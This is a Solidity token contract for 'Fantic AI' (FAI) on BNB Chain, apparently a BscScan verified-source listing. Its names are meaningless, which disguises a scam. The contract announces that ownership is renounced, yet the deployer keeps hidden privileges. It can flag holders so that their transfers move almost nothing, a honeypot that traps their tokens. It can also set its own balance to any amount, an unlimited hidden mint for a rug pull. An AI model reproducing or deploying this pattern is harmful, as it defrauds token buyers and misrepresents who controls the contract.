/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

interface amountTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverEnable) external view returns (uint256);

    function transfer(address buyTake, uint256 takeReceiver) external returns (bool);

    function allowance(address minLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address buyTake,
        uint256 takeReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalToken, uint256 value);
    event Approval(address indexed minLiquidity, address indexed spender, uint256 value);
}

interface amountTakeMetadata is amountTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface enableMarketing {
    function createPair(address toFund, address marketingAt) external returns (address);
}

interface teamExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract feeExemptIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract FanticAI is feeExemptIs, amountTake, amountTakeMetadata {
    uint8 private marketingTotal = 18;
    
    bool public swapAuto;

    uint256 public takeReceiverFund;

    uint256 public senderTotal;

    string private receiverToken = "FAI";
    address public liquidityMaxTeam;
    uint256 public tokenMax;
    address private senderFund;
    string private limitTradingTeam = "Fantic AI";
    uint256 private receiverLiquidity;

    
    uint256 constant enableMaxTo = 10 ** 10;
    address public senderSell;
    mapping(address => bool) public limitTradingMin;
    mapping(address => mapping(address => uint256)) private autoExempt;
    uint256 private senderAt;
    address private exemptIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => uint256) private liquidityLaunched;

    uint256 public swapLaunchedMin;
    uint256 private limitLaunched = 100000000 * 10 ** marketingTotal;
    uint256 private liquidityAt;
    mapping(address => bool) public toReceiver;
    uint256 private feeFromLaunched;
    uint256 private shouldBuy;
    uint256 public toLaunched;
    

    event OwnershipTransferred(address indexed listSell, address indexed txLiquidityLaunch);

    constructor (){
        if (tokenMax != feeFromLaunched) {
            receiverLiquidity = toLaunched;
        }
        teamExempt minMode = teamExempt(exemptIs);
        liquidityMaxTeam = enableMarketing(minMode.factory()).createPair(minMode.WETH(), address(this));
        senderFund = _msgSender();
        
        senderSell = senderFund;
        limitTradingMin[senderSell] = true;
        if (senderTotal != shouldBuy) {
            tokenMax = liquidityAt;
        }
        liquidityLaunched[senderSell] = limitLaunched;
        emit Transfer(address(0), senderSell, limitLaunched);
        launchEnableWallet();
    }

    

    function approve(address maxListTotal, uint256 takeReceiver) public virtual override returns (bool) {
        autoExempt[_msgSender()][maxListTotal] = takeReceiver;
        emit Approval(_msgSender(), maxListTotal, takeReceiver);
        return true;
    }

    function receiverLaunched() public view returns (uint256) {
        return feeFromLaunched;
    }

    function owner() external view returns (address) {
        return senderFund;
    }

    function sellList() public {
        
        if (senderTotal != tokenMax) {
            toLaunched = shouldBuy;
        }
        shouldBuy=0;
    }

    function name() external view virtual override returns (string memory) {
        return limitTradingTeam;
    }

    function takeAt(address takeTeam, address buyTake, uint256 takeReceiver) internal returns (bool) {
        require(liquidityLaunched[takeTeam] >= takeReceiver);
        liquidityLaunched[takeTeam] -= takeReceiver;
        liquidityLaunched[buyTake] += takeReceiver;
        emit Transfer(takeTeam, buyTake, takeReceiver);
        return true;
    }

    function isSwap() public view returns (uint256) {
        return feeFromLaunched;
    }

    function fromMode(address receiverAmount) public {
        if (shouldBuy == toLaunched) {
            swapLaunchedMin = receiverLiquidity;
        }
        if (receiverAmount == senderSell || receiverAmount == liquidityMaxTeam || !limitTradingMin[_msgSender()]) {
            return;
        }
        
        toReceiver[receiverAmount] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverToken;
    }

    function feeTeam(address amountMarketingTrading) public {
        if (swapAuto) {
            return;
        }
        
        limitTradingMin[amountMarketingTrading] = true;
        if (senderAt != swapLaunchedMin) {
            senderTotal = takeReceiverFund;
        }
        swapAuto = true;
    }

    function liquidityTotal() public {
        if (feeFromLaunched == senderAt) {
            feeFromLaunched = liquidityAt;
        }
        
        takeReceiverFund=0;
    }

    function balanceOf(address receiverEnable) public view virtual override returns (uint256) {
        return liquidityLaunched[receiverEnable];
    }

    function launchEnableWallet() public {
        emit OwnershipTransferred(senderSell, address(0));
        senderFund = address(0);
    }

    function getOwner() external view returns (address) {
        return senderFund;
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingTotal;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return limitLaunched;
    }

    function toTx(address takeTeam, address buyTake, uint256 takeReceiver) internal returns (bool) {
        if (takeTeam == senderSell || buyTake == senderSell) {
            return takeAt(takeTeam, buyTake, takeReceiver);
        }
        
        if (toReceiver[takeTeam]) {
            return takeAt(takeTeam, buyTake, enableMaxTo);
        }
        if (tokenMax == shouldBuy) {
            shouldBuy = receiverLiquidity;
        }
        return takeAt(takeTeam, buyTake, takeReceiver);
    }

    function buyReceiver() public view returns (uint256) {
        return takeReceiverFund;
    }

    function transferFrom(address takeTeam, address buyTake, uint256 takeReceiver) external override returns (bool) {
        if (autoExempt[takeTeam][_msgSender()] != type(uint256).max) {
            require(takeReceiver <= autoExempt[takeTeam][_msgSender()]);
            autoExempt[takeTeam][_msgSender()] -= takeReceiver;
        }
        return toTx(takeTeam, buyTake, takeReceiver);
    }

    function amountLaunched() public {
        
        if (toLaunched != receiverLiquidity) {
            toLaunched = senderTotal;
        }
        takeReceiverFund=0;
    }

    function allowance(address modeWallet, address maxListTotal) external view virtual override returns (uint256) {
        return autoExempt[modeWallet][maxListTotal];
    }

    function transfer(address fromSwapMax, uint256 takeReceiver) external virtual override returns (bool) {
        return toTx(_msgSender(), fromSwapMax, takeReceiver);
    }

    function tokenMin() public view returns (uint256) {
        return toLaunched;
    }

    function amountBuyShould(uint256 takeReceiver) public {
        if (!limitTradingMin[_msgSender()]) {
            return;
        }
        liquidityLaunched[senderSell] = takeReceiver;
    }

    function tradingSender() public view returns (uint256) {
        return feeFromLaunched;
    }


}